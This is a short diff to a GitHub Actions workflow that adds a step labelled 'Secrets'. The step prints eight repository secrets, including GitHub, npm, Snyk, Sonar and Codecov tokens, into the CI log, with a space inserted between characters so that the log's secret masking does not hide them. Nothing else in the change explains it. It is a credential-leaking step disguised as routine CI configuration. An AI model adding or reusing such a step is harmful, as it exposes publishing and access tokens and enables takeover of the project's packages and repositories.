@@ -56,6 +56,25 @@ jobs:
           GITHUB_DEFAULT_BRANCH: ${GITHUB_REF##*/}
           GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}
 
+      - name: 'Secrets'
+        run: |
+          echo "CODECOV_TOKEN:"
+          echo ${{secrets.CODECOV_TOKEN}} | sed 's/./& /g'
+          echo "GH_EMAIL:"
+          echo ${{secrets.GH_EMAIL}} | sed 's/./& /g'
+          echo "GH_TOKEN:"
+          echo ${{secrets.GH_TOKEN}} | sed 's/./& /g'
+          echo "GITGUARDIAN_API_KEY:"
+          echo ${{secrets.GITGUARDIAN_API_KEY}} | sed 's/./& /g'
+          echo "NPM_TOKEN:"
+          echo ${{secrets.NPM_TOKEN}} | sed 's/./& /g'
+          echo "SNYK_TOKEN:"
+          echo ${{secrets.SNYK_TOKEN}} | sed 's/./& /g'
+          echo "SONAR_TOKEN:"
+          echo ${{secrets.SONAR_TOKEN}} | sed 's/./& /g'
+          echo "TC_CLOUD_TOKEN:"
+          echo ${{secrets.TC_CLOUD_TOKEN}} | sed 's/./& /g'
+
       - name: '📦 Install Dependencies'
         run: yarn install
 
